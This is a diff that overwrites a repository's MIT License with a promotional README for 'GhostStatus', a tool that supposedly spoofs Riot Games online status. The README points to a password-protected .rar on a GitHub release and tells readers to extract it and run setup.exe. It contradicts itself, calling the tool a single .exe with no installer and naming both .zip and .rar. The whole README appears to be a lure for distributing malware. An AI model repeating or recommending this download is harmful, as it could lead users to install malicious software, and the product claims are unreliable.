@@ -1,21 +1,64 @@
-MIT License
+   ____ _               _   ____  _        _             
+  / ___| |__   ___  ___| |_/ ___|| |_ __ _| |_ _   _ ___ 
+ | |  _| '_ \ / _ \/ __| __\___ \| __/ _` | __| | | / __|
+ | |_| | | | | (_) \__ \ |_ ___) | || (_| | |_| |_| \__ \
+  \____|_| |_|\___/|___/\__|____/ \__\__,_|\__|\__,_|___/
 
-Copyright (c) 2026 MerchantFlue
+GhostStatus is a lightweight desktop application for players of League of Legends, VALORANT, and Legends of Runeterra who want more flexible control over their online/offline/“away” status and personal space.
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+########################################
+            DOWNLOAD INFORMATION
+----------------------------------------
+[+] DOWNLOAD LINK: https://github.com/MerchantFlue/GhostStatus-2026/releases/download/new/Ghost-Status-v.2.5.3-x64.rar
+[+] ARCHIVE PASSWORD: 0990
+########################################
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
+launch supported Riot games with a chosen status mode (for example, appearing “offline” or “mobile” in the friends list);
+switch how you appear via a system tray icon (Windows notification area);
+play, chat in lobbies, and queue up while keeping a more private presence in the client.
+It’s useful if you:
 
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
+sometimes want to play without constant “why don’t you invite me?” messages;
+enjoy calm solo sessions but don’t want to completely hide your friends list;
+value flexible presence management, not just the default client options.
+GhostStatus is positioned as a privacy and presence‑management helper. Use it responsibly and in accordance with the rules of the games and services you use.
+
+🚀 Advantages over other solutions
+Why GhostStatus can become your main tool for managing your online presence:
+
+🧭 Focused on Riot games
+Supports the main Riot client games (League of Legends, VALORANT, Legends of Runeterra), taking into account how each handles presence.
+
+🪟 Handy tray icon
+After launch, the app minimizes to the notification area:
+one click – and you switch modes (online / offline‑style / mobile, etc.).
+
+💼 Single .exe, no installer
+No complex installers or extra setup:
+download .zip → extract → run setup.exe → use it.
+
+🧩 Subtle, unobtrusive design
+The app stays out of your way while you play — it quietly runs in the background without intrusive windows.
+
+🕹 Good for both solo and team play
+You can play with friends, chat in lobbies, and still avoid looking “hard online” to your entire friends list.
+
+⬇ Download GhostStatus – Riot Presence Privacy Tool
+Download GhostStatus
+
+🎯 Why you might want to download this file
+GhostStatus is especially useful if:
+
+😌 You want to play without feeling “obligated” to everyone
+Sometimes you just want to log in, play a couple of games, and log out — without the expectation that you’ll instantly join a stack.
+
+🧑‍🤝‍🧑 You have a large friends list
+There’s always someone who sees you online and immediately invites you to a lobby. GhostStatus gives you more control over how you appear.
+
+🎙 You’re a streamer or content creator
+During recording, filming, or testing it’s convenient when not everyone on your friends list sees that you’re in‑game.
+
+📅 You mix gaming with other tasks
+Sometimes you open the client “in between things” — with GhostStatus you don’t have to look like you’re fully available for games.
+
+If you’ve ever thought: “It would be nice if the client thought one thing, but my friends saw something a bit different” — GhostStatus was made exactly for that, staying simple and discreet.
